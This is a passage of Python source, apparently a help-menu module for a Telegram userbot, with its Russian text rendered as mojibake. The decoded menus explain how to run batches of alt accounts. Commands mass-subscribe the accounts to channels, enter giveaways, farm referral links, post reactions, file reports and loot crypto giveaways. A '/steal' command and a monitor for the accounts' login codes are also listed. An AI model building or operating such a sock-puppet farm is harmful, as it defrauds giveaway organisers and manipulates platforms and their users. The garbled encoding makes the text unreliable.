            "–î–∞–ª–µ–µ –¥–ª—è —É–¥–æ–±—Å—Ç–≤–∞ –∏–∑ –∫–∞–∂–¥–æ–π –ø–∞—á–∫–∏ –Ω–∞–¥–æ –≤—ã–±—Ä–∞—Ç—å 1 —Ç–≤–∏–Ω–∫ –∏ –≤–∫–ª—é—á–∏—Ç—å –Ω–∞ –Ω–∏—Ö –ª–æ–≥–≥–µ—Ä. "
            "Logger –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥ —Å–æ—Ñ—Ç–∞. –ò–∑–Ω–∞—á–∞–ª—å–Ω–æ –æ–Ω –≤–µ–∑–¥–µ –≤—ã–∫–ª—é—á–µ–Ω.\n\n"

            "–ë–∞–∑–æ–≤–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞, –ø—Ä–æ–¥–æ–ª–∂–∞–π –ø–æ —Ç–∞–∫–æ–º—É –∂–µ –ø—Ä–∏–Ω—Ü–∏–ø—É.</b>"
        )
        buttons = [
            [
                {
                    "text": "/set", 
                    "callback": self.manual_set_param
                },
                {
                    "text": "/reconfig", 
                    "callback": self.manual_reconfig_param
                },
                {
                    "text": "/get", 
                    "callback": self.manual_get_param
                }
            ],
            [
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                },
            ]
        ]
        await call.edit(
            text=text,
            reply_markup=buttons,
            photo="https://i.ibb.co/chC5QPSv/CONFIG.png"
        )

#=======================================================================================

    async def manual_general(self, call):
        text = (
            "<b>–í–∞–∂–Ω–æ–µ –ø–æ —Ö–æ—Å—Ç–∞–º –∏ —é–∑–µ—Ä–±–æ—Ç–∞–º.</b>\n\n"
            "–ù–∞ –ª—é–±–æ–º —Ö–æ—Å—Ç–µ –Ω–µ –∑–∞–±—ã–≤–∞–π—Ç–µ –¥–µ—Ä–∂–∞—Ç—å –∏–Ω—Ç–µ—Ä–≤–∞–ª—ã –º–µ–∂–¥—É –∫–æ–º–∞–Ω–¥–∞–º–∏. "
            "–í –∏–¥–µ–∞–ª–µ ‚Äî 3-5 –º–∏–Ω—É—Ç –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø—Ä–æ—à–ª–æ–≥–æ —Ü–∏–∫–ª–∞. "
            "–ï—Å–ª–∏ –≤—ã –Ω–µ –¥–µ—Ä–∂–∏—Ç–µ –∏–Ω—Ç–µ—Ä–≤–∞–ª—ã ‚Äî —Å–µ—Ä–≤–∞–∫ –ª—è–∂–µ—Ç –∏ –≤—ã –±—É–¥–µ—Ç–µ –Ω—ã—Ç—å. "
            "–ö–æ–º–∞–Ω–¥—ã –≤—ã –º–æ–∂–µ—Ç–µ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –≤ –ª—é–±–æ–º —á–∞—Ç–µ –≥–¥–µ –µ—Å—Ç—å –≤–∞—à–∏ —Ç–≤–∏–Ω–∫–∏, "
            "–∏–ª–∏ –≤–æ–æ–±—â–µ –≤ –ª—Å –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º—É –∞–∫–∫—É. –ù–æ –ª—É—á—à–µ –≤ –æ–≤–Ω–µ—Ä—á–∞—Ç–µ.\n\n"
            "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /reconfig –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –∞–∫–∫–∞—É–Ω—Ç–æ–≤ (–∏–∑ "
            "—Å–ø–∏—Å–∫–∞ –≤ –∫–∞–Ω–∞–ª–µ) –∏ /license –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –¥–± (–º–æ–∂–Ω–æ –≤ –ª—Å —Ç–≤–∏–Ω–∫—É).\n\n"
            "–ï—Å–ª–∏ –≤—ã —É—Å—Ç–∞–Ω–æ–≤–∏–ª–∏ —é–∑–µ—Ä–±–æ—Ç–∞ –Ω–∞ VDS - —É –≤–∞—Å –µ—Å—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Ñ–∞–π–ª–æ–≤–æ–π "
            "—Å–∏—Å—Ç–µ–º–µ –∏ –≤—ã –º–æ–∂–µ—Ç–µ —Å–ø–æ–∫–æ–π–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∞–Ω—Ç–∏–∫–∞–ø—á—É."
        )
        buttons = [
            [
                {
                    "text": "HIKKA", 
                    "callback": self.manual_general_hikka
                },
                {
                    "text": "HEROKU", 
                    "callback": self.manual_general_heroku
                },
            ],
            [
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                },
            ]
        ]
        await call.edit(
            text=text,
            reply_markup=buttons,
            photo="https://i.ibb.co/pB0Fd2Dz/HOST.jpg"
        )

#=======================================================================================

    async def manual_general_hikka(self, call):
        text = (
            "<b>üåò Hikka v1.6.3 on VDS</b>\n\n"

            "–ü–æ—Å–ª–µ–¥–Ω–µ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –±—ã–ª–æ –≤ 2022–≥, –ø–æ—ç—Ç–æ–º—É —Ç—É—Ç –µ—Å—Ç—å –Ω–µ–±–æ–ª—å—à–∏–µ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è. "
            "–û–¥–Ω–∞–∫–æ, –≤ —Ü–µ–ª–æ–º, —ç—Ç–æ —Å–∞–º—ã–π —Å—Ç–∞–±–∏–ª—å–Ω—ã–π –∏ —É–¥–æ–±–Ω—ã–π —é–∑–µ—Ä–±–æ—Ç –∏–∑ –≤—Å–µ—Ö —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö. "
            "–£ –≤–∞—Å –µ—Å—Ç—å –¥–æ—Å—Ç—É–ø –∫ .weburl –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–∞.\n\n"

            "–ò–∑ –º–∏–Ω—É—Å–æ–≤ - –≤ —ç—Ç–æ–π –≤–µ—Ä—Å–∏–∏ –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è WEB. "
            "–ù–∞–ø—Ä–∏–º–µ—Ä, –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã –º–æ–¥—É–ª–∏ –ø–æ–¥ giveshare, cryptobot giveaway –∏ –ø—Ä–æ—á–∏–µ. "
            "–¢–∞–∫–∂–µ –≤ —ç—Ç–æ–π –≤–µ—Ä—Å–∏–∏ –±–æ—Ç –Ω–µ –≤–∏–¥–∏—Ç –ø–æ—Å—Ç—ã —Å —Ü–∏—Ç–∞—Ç–∞–º–∏, –Ω–∞–ø—Ä–∏–º–µ—Ä –≤ —Ä–∞–Ω–Ω–µ—Ä–µ –∏–ª–∏ —Ä–µ–∞–∫—Ç–æ—Ä–µ.\n\n"
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_general
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                }
            ],
        ]
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_general_heroku(self, call):
        text = (
            "<b>ü™ê Heroku v1.6.8 on VDS</b>\n\n"

            "–û–±–Ω–æ–≤–ª–µ–Ω–∏—è –≤—ã–ø—É—Å–∫–∞—é—Ç—Å—è —Ä–µ–≥—É–ª—è—Ä–Ω–æ, –ø–æ—ç—Ç–æ–º—É –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–π –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏ –Ω–µ—Ç. "
            "–•–µ—Ä–æ–∫—É –ø–æ—Å—Ç—Ä–æ–µ–Ω –Ω–∞ –æ—Å–Ω–æ–≤–µ –±–µ—Ç–∞-–≤–µ—Ä—Å–∏–∏ Hikka v1.6.4. "
            "–¢–∞–∫ –∫–∞–∫ —ç—Ç–æ –Ω–µ—Å—Ç–∞–±–∏–ª—å–Ω–∞—è —Å–±–æ—Ä–∫–∞ - —á–∞—Å—Ç–æ –≤—Å—Ç—Ä–µ—á–∞—é—Ç—Å—è –±–∞–≥–∏. "
            "–ù–∞–ø—Ä–∏–º–µ—Ä, –∏–Ω–æ–≥–¥–∞ –ª–æ–º–∞–µ—Ç—Å—è .weburl. –í —Ü–µ–ª–æ–º, —ç—Ç–æ —Ç–æ—Ç –∂–µ —Å–∞–º—ã–π Hikka.\n\n"

            "–ò–∑ –ø–ª—é—Å–æ–≤ - –≤ —ç—Ç–æ–π –≤–µ—Ä—Å–∏–∏ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è WEB, —Ü–∏—Ç–∞—Ç—ã –∏ —Ç–¥. "
            "–ù–∞–ø—Ä–∏–º–µ—Ä, –≤—ã –º–æ–∂–µ—Ç–µ –ª—É—Ç–∞—Ç—å giveshare, cryptobot giveaway –∏ –ø—Ä–æ—á–∏–µ –≤–µ–±–∞–ø–ø—ã. "
            "–ü–æ—Å—Ç—ã —Å —Ü–∏—Ç–∞—Ç–∞–º–∏ –±–æ—Ç —Ç–æ–∂–µ —Å–ø–æ–∫–æ–π–Ω–æ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç.\n\n"
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_general
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                }
            ],
        ]
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_set_param(self, call):
        text = (
            "<b>üîó –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤:</b>\n"
            "/set [param] [value] [users]\n"
            "‚ñ´Ô∏è logger - –ª–æ–≥–≥–µ—Ä (bool)\n"
            "‚ñ´Ô∏è group - –Ω–æ–º–µ—Ä –ø–∞—á–∫–∏ (int)\n"
            "‚ñ´Ô∏è selector - –∞–≤—Ç–æ–∫–æ–¥—ã –≤—Ö–æ–¥–∞ / –ª—Å –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ (bool)\n\n"
            "–ü—Ä–∏–º–µ—Ä:\n"
            "/set logger true @user1 123456789 WORKER228\n\n"
            "BOOL - true/false, on/off, yes/no, 1/0, y/n, t/f.\n"
            "INT - 1, 2, 3, ..., 100...\n"
            "USER - —Ç–µ–≥, –∞–π–¥–∏, –Ω–∏–∫, –Ω–æ–º–µ—Ä. \n"
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_basic
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                },
            ]
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_reconfig_param(self, call):
        text = (
            "<b>üîó –ê–≤—Ç–æ–Ω–∞—Å—Ç—Ä–æ–π–∫–∞ /reconfig</b>\n\n"
            "–í —Å–≤–æ–µ–º –æ–≤–Ω–µ—Ä—á–∞—Ç–µ, –∫–æ—Ç–æ—Ä—ã–π –∫ —Å–æ—Ñ—Ç—É –ø—Ä–∏–≤—è–∑–∞–Ω, –¥–µ–ª–∞–µ—à—å 3 –ø–æ—Å—Ç–∞. –í –∫–∞–∂–¥–æ–º –ø–∏—à–µ—à—å:\n"
            "SETTINGS BENGAL 1, SETTINGS BENGAL 2, SETTINGS BENGAL 3 (BENGAL –∑–∞–º–µ–Ω–∏—Ç—å –Ω–∞ —Å–≤–æ–π —Å–æ—Ñ—Ç).\n\n"
            "–í –∫–∞–∂–¥–æ–º –ø–∏—à–µ—à—å group 2 –∏ —Å –Ω–æ–≤–æ–π —Å—Ç—Ä–æ–∫–∏ –≤—Å–µ @—é–∑–µ—Ä—ã —Ç–≤–∏–Ω–∫–æ–≤ –ø–∞—á–∫–∏ 2 (5-10 —à—Ç.). "
            "–ò –¥–∞–ª—å—à–µ –ø–æ –æ—á–µ—Ä–µ–¥–∏ –≤—Å–µ –ø–∞—á–∫–∏ —Ç–∞–∫ –∂–µ —Å–∞–º–æ.\n\n"
            "–ù–∞–ø—Ä–æ—Ç–∏–≤ –æ–¥–Ω–æ–≥–æ –∏–∑ –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –∫–∞–∂–¥–æ–π –ø–∞—á–∫–∏ –ø–∏—à–µ—à—å logger. –ù–∞ –Ω–∏—Ö –æ–Ω –∏ –≤–∫–ª—é—á–∏—Ç—Å—è.\n\n"
            "–í—ã–ø–æ–ª–Ω—è–µ—à—å –∫–æ–º–∞–Ω–¥—É /reconfig –∏ –∞–∫–∫–∞—É–Ω—Ç –ø—Ä–æ–ø–∞—Ä—Å–∏—Ç –∑–Ω–∞—á–µ–Ω–∏—è –∏–∑ –≤—Å–µ—Ö –ø–æ—Å—Ç–æ–≤, –Ω–∞–π–¥–µ—Ç —Å–µ–±—è –∏ "
            "–ø—Ä–∏–º–µ–Ω–∏—Ç –∫ –Ω—É–∂–Ω—ã–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏. –ï—Å–ª–∏ –≤ –ø–æ—Å—Ç–∞—Ö –Ω–µ—Ç—É –∑–Ω–∞—á–µ–Ω–∏–π - –æ—Å—Ç–∞–≤–∏—Ç –±–∞–∑–æ–≤—ã–µ.\n\n"
            "*–ü–æ—Å—Ç–æ–≤ –¥–µ–ª–∞–µ–º 3 —à—Ç—É–∫–∏ —Å –∑–∞–ø–∞—Å–æ–º –∏–∑-–∑–∞ –ª–∏–º–∏—Ç–∞ –Ω–∞ –¥–ª–∏–Ω—É —Å–º—Å, –≤ –∫–∞–∂–¥—ã–π –≤–ª–∞–∑–∏—Ç —à—Ç—É–∫ –ø–æ 300 –∞–∫–∫–∞—É–Ω—Ç–æ–≤. "
            "–°—Å—ã–ª–∫–∏ –Ω–∞ –ø–æ—Å—Ç—ã –ø—Ä–æ–ø–∏—Å–∞–Ω—ã –≤ –º–æ–¥—É–ª–µ, —Å–º–µ–Ω–∏—Ç—å –∏—Ö –Ω–µ–ª—å–∑—è. –ú–æ–∂–Ω–æ —Ç–æ–ª—å–∫–æ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å —Å–∞–º–∏ –ø–æ—Å—Ç—ã."
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_basic
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                }
            ],
        ]
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_get_param(self, call):
        text = (
            "<b>üîó –ò–Ω—Ñ–∞ –ø—Ä–æ –∞–∫–∫–∏ /get</b>\n\n"
            "–ö–æ–Ω–∫—Ä–µ—Ç–Ω—ã–µ –∞–∫–∫–∏ - —Å–ø–∏—Å–æ–∫ –∏–∑ @, –Ω–∏–∫, –Ω–æ–º–µ—Ä, –∞–π–¥–∏. –ü—Ä–∏–º–µ—Ä:\n/get @user1 123456789\n\n"
            "–í—Å–µ –∞–∫–∫–∏ - /get all\n\n"
            "–ü–æ–∏—Å–∫ –ø–æ group (–ø–∞—á–∫–∞–º) - –≤—Ç–æ—Ä—ã–º –∞—Ä–≥—É–º–µ–Ω—Ç–æ–º —É–∫–∞–∑—ã–≤–∞–µ–º —Å–ø–∏—Å–æ–∫ –≥—Ä—É–ø–ø (int) —á–µ—Ä–µ–∑ –ø—Ä–æ–±–µ–ª. "
            "–ü—Ä–∏–º–µ—Ä:\n/get group 2 5 15\n"
            "–í—ã–≤–µ–¥–µ—Ç –≤—Å–µ –∞–∫–∫–∏ —Å –Ω–æ–º–µ—Ä–∞–º–∏ 2, 5 –∏ 15.\n\n"
            "–ü–æ–∏—Å–∫ –ø–æ logger - –≤—Ç–æ—Ä—ã–º –∞—Ä–≥—É–º–µ–Ω—Ç–æ–º —É–∫–∞–∑—ã–≤–∞–µ–º –µ–≥–æ –∑–Ω–∞—á–µ–Ω–∏–µ (bool). "
            "–ü—Ä–∏–º–µ—Ä:\n/get logger true\n"
            "–í—ã–≤–µ–¥–µ—Ç –≤—Å–µ –∞–∫–∫–∏ —Å –≤–∫–ª—é—á–µ–Ω–Ω—ã–º –ª–æ–≥–≥–µ—Ä–æ–º.\n\n"
            "–ï—Å–ª–∏ –≤ –ª—Å –ø–∏—à–µ—Ç–µ - –º–æ–∂–Ω–æ –ø—Ä–æ—Å—Ç–æ /get, –±–µ–∑ –≤–∞–ª–∏–¥–∞\n"
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_basic
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                },
            ]
        ]
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_commands(self, call):
        text = "<b>‚öôÔ∏è –í—ã–±–µ—Ä–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É:</b>"
        buttons = [
            [
                {
                    "text": "/sub", 
                    "callback": self.manual_subscribe
                },
                {
                    "text": "/run", 
                    "callback": self.manual_runner
                },
                {
                    "text": "/ref", 
                    "callback": self.manual_referal
                },
            ],
            [
                {
                    "text": "/uns", 
                    "callback": self.manual_unsubscribe
                },
                {
                    "text": "/clean", 
                    "callback": self.manual_clean
                },
                {
                    "text": "/report", 
                    "callback": self.manual_reporter
                },
            ],
            [
                {
                    "text": "/tegive", 
                    "callback": self.manual_tegive
                },
                {
                    "text": "/cryptogive",
                    "callback": self.manual_cryptogive
                },
            ],
            [
                {
                    "text": "/react", 
                    "callback": self.manual_reactor
                },
                {
                    "text": "/action", 
                    "callback": self.manual_action
                },
                {
                    "text": "/system", 
                    "callback": self.manual_system
                },
            ],
            [
                {
                    "text": "–ú–µ–Ω–µ–¥–∂–µ—Ä –õ–°",
                    "callback": self.manual_pm_manager
                },
                {
                    "text": "–í –¥–æ—Ä–∞–±–æ—Ç–∫–µ",
                    "callback": self.manual_commands_dorabotki
                },
            ],
            [
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é",
                    "callback": self.manual_main
                },
            ]
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons,
            photo="https://i.ibb.co/9kw9WX5g/COMMANDS.png"
        )

#=======================================================================================

    async def manual_commands_dorabotki(self, call):
        text = "<b>‚öôÔ∏è –í—ã–±–µ—Ä–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É (–º–æ–¥—É–ª–∏ —Ä–∞–±–æ—á–∏–µ, –Ω–æ –Ω–∞ –¥–æ—Ä–∞–±–æ—Ç–∫–µ):</b>"
        buttons = [
            [
                {
                    "text": "/steal",
                    "callback": self.manual_cryptosteal
                },
                {
                    "text": "/giveshare",
                    "callback": self.manual_giveshare
                },
            ],
            [
                {
                    "text": "/infochan",
                    "callback": self.manual_infochan
                },
                {
                    "text": "/sms", 
                    "callback": self.manual_sms
                },
                {
                    "text": "/contact",
                    "callback": self.manual_contacter
                }
            ],
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥",
                    "callback": self.manual_commands
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é",
                    "callback": self.manual_main
                }
            ],
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================
    
    async def manual_pm_manager(self, call):
        access = "‚úÖ –î–æ—Å—Ç—É–ø–µ–Ω –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é" if self.get("lic_pmm", False) else "‚ùå –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω"
        text = (
            f"<b>üìù –ú–µ–Ω–µ–¥–∂–µ—Ä —á–∞—Ç–æ–≤ –õ–°</b>\n{access}\n\n"
            "–ù–µ –∏–º–µ–µ—Ç –∫–æ–º–∞–Ω–¥. –ú–æ–∂–Ω–æ —Ç–æ–ª—å–∫–æ –≤–∫–ª—é—á–∏—Ç—å –∏–ª–∏ –≤—ã–∫–ª—é—á–∏—Ç—å. "
            "–û–Ω –º–æ–Ω–∏—Ç–æ—Ä–∏—Ç –∫–æ–¥—ã –¥–ª—è –≤—Ö–æ–¥–∞ –∏ –≤—ã–≤–æ–¥–∏—Ç –∏—Ö, –∞ —Ç–∞–∫–∂–µ –≤—Å–µ –ª—Å —á–∞—Ç—ã —Ç–≤–∏–Ω–∫–æ–≤. "
            "–í—ã–≤–æ–¥–∏—Ç –≤–∞–º —Ç–µ–∫—Å—Ç–æ–≤—ã–µ —Å–º—Å —Å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å—é –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å, –æ—Ç–≤–µ—Ç–∏—Ç—å, "
            "–ø–æ—Å—Ç–∞–≤–∏—Ç—å —Ä–µ–∞–∫—Ü–∏—é, –∑–∞–±–∞–Ω–∏—Ç—å, –∑–∞–º—É—Ç–∏—Ç—å –∏ —Ç–¥."
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_commands
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                }
            ],
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================
    async def manual_subscribe(self, call):
        access = "‚úÖ –î–æ—Å—Ç—É–ø–µ–Ω –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é" if self.get("lic_sub", False) else "‚ùå –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω"
        text = (
            f"<b>üìù –ü–æ–¥–ø–∏—Å–∫–∏ –Ω–∞ –∫–∞–Ω–∞–ª—ã / —á–∞—Ç—ã</b>\n{access}\n\n"
            "üîó /sub [mult] [target]\n"
            "‚ñ´Ô∏è [mult] - –º–Ω–æ–∂–∏—Ç–µ–ª—å –∑–∞–¥–µ—Ä–∂–∫–∏ (–Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)\n"
            "‚ñ´Ô∏è [target] - –ø—É–±–ª–∏—á–Ω–∞—è (–º–æ–∂–Ω–æ –¥–∞–∂–µ –Ω–∞ –ø–æ—Å—Ç) –∏–ª–∏ –ø—Ä–∏–≤–∞—Ç–Ω–∞—è —Å—Å—ã–ª–∫–∞, @username, –º–æ–∂–Ω–æ –Ω–µ—Å–∫–æ–ª—å–∫–æ\n\n"
            "–ü—Ä–∏–º–µ—Ä—ã:\n"
            "/sub @channel1 @channel2\n"
            "/sub 5 https://t.me/channel\n"
            "/sub 10 t.me/channel\n"
            "/sub https://t.me/channel/123\n"
            "/sub https://t.me/+hash\n\n"
            "–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ:\n"
            "–ò–¥—É—Ç –ø—Ä–æ—Å–º–æ—Ç—Ä—ã –Ω–∞ –ø–æ—Å–ª–µ–¥–Ω–∏–µ –ø–æ—Å—Ç—ã –∏ –∞–≤—Ç–æ–∞—Ä—Ö–∏–≤–∞—Ü–∏—è.\n"
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_commands
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                }
            ]
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_unsubscribe(self, call):
        access = "‚úÖ –î–æ—Å—Ç—É–ø–µ–Ω –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é" if self.get("lic_uns", False) else "‚ùå –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω"
        text = (
            f"<b>üìù –û—Ç–ø–∏—Å–∫–∞ –æ—Ç –∫–∞–Ω–∞–ª–æ–≤ / —á–∞—Ç–æ–≤</b>\n{access}\n\n"
            "üîó /uns [mult] [target]\n"
            "‚ñ´Ô∏è [mult] - –º–Ω–æ–∂–∏—Ç–µ–ª—å –∑–∞–¥–µ—Ä–∂–∫–∏ (–Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)\n"
            "‚ñ´Ô∏è [target] - –ø—É–±–ª–∏—á–Ω–∞—è –∏–ª–∏ –ø—Ä–∏–≤–∞—Ç–Ω–∞—è —Å—Å—ã–ª–∫–∞ (–º–æ–∂–Ω–æ –¥–∞–∂–µ –Ω–∞ –ø–æ—Å—Ç), @username, ID (–±–µ–∑ –º–∏–Ω—É—Å–∞), –º–æ–∂–Ω–æ –Ω–µ—Å–∫–æ–ª—å–∫–æ\n\n"
            "–ü—Ä–∏–º–µ—Ä—ã:\n"
            "/uns @channel\n"
            "/uns 2 t.me/channel"
            "/uns 10 https://t.me/c/123/456\n"
            "/uns 123456789 987654321"
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥",
                    "callback": self.manual_commands
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                }
            ]
        ]
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_runner(self, call):
        access = "‚úÖ –î–æ—Å—Ç—É–ø–µ–Ω –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é" if self.get("lic_run", False) else "‚ùå –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω"
        text = (
            f"<b>üìù –ò–Ω–ª–∞–π–Ω —Ä–∞–Ω–Ω–µ—Ä</b>\n{access}\n\n"
            "üîó /run [mult] [link]\n"
            "‚ñ´Ô∏è [mult] - –º–Ω–æ–∂–∏—Ç–µ–ª—å –∑–∞–¥–µ—Ä–∂–∫–∏ (–Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)\n"
            "‚ñ´Ô∏è [link] - —Å—Å—ã–ª–∫–∞ –Ω–∞ –ø–æ—Å—Ç —Å –∫–Ω–æ–ø–∫–æ–π\n\n"
            "–ü—Ä–∏–º–µ—Ä—ã:\n"
            "/run https://t.me/channel/123\n"
            "/run 20 t.me/c/123/456\n\n"
            "–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ:\n"
            "–ù–∞ –ø–æ—Å—Ç —Ä–æ–∑—ã–≥—Ä—ã—à–∞ –∏–¥—É—Ç –ø—Ä–æ—Å–º–æ—Ç—Ä—ã.\n"
        )
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.manual_commands
                },
                {
                    "text": "¬´ –ù–∞ –≥–ª–∞–≤–Ω—É—é", 
                    "callback": self.manual_main
                }
            ]
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_referal(self, call):
        access = "‚úÖ –î–æ—Å—Ç—É–ø–µ–Ω –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é" if self.get("lic_ref", False) else "‚ùå –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω"
        text = (
            f"<b>üìù –¢–µ–∫—Å—Ç–æ–≤—ã–µ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∏–∫–∏</b>\n{access}\n\n"
            "üîó /ref [mult] [link]\n"
            "‚ñ´Ô∏è [mult] - –º–Ω–æ–∂–∏—Ç–µ–ª—å –∑–∞–¥–µ—Ä–∂–∫–∏ (–Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)\n"
            "‚ñ´Ô∏è [link] - —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞ —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º ?start= –ª–∏–±–æ —Å—Å—ã–ª–∫–∞ –Ω–∞ –ø–æ—Å—Ç —Ä–æ–∑—ã–≥—Ä—ã—à–∞.\n\n"
            "–ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–µ –±–æ—Ç—ã:\n"
            "@BestRandom_bot\n@TheFastes_Bot\n@TheFastesRuBot\n"
            "@GiveawayLuckyBot\n@best_contests_bot\n@TicketsBot\n\n"
            "–ü—Ä–∏–º–µ—Ä—ã:\n"
            "/ref 2 https://t.me/BestRandom_bot?start=lot_join3333296p79a676a7e4010ad988029f76ade390bd\n"
            "/ref https://t.me/c/1234567890/1234567890\n\n"
            "–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ:\n"
            "–í –±–µ—Å—Ç—Ä–∞–Ω–¥–æ–º–µ –∏–¥—É—Ç –ø—Ä–æ—Å–º–æ—Ç—Ä—ã –Ω–∞ –ø–æ—Å—Ç —Ä–æ–∑—ã–≥—Ä—ã—à–∞. –í –±–µ—Å—Ç—Ä–∞–Ω–¥–æ–º–µ –∏ –±–µ—Å—Ç–∫–æ–Ω—Ç–µ—Å—Ç–µ "
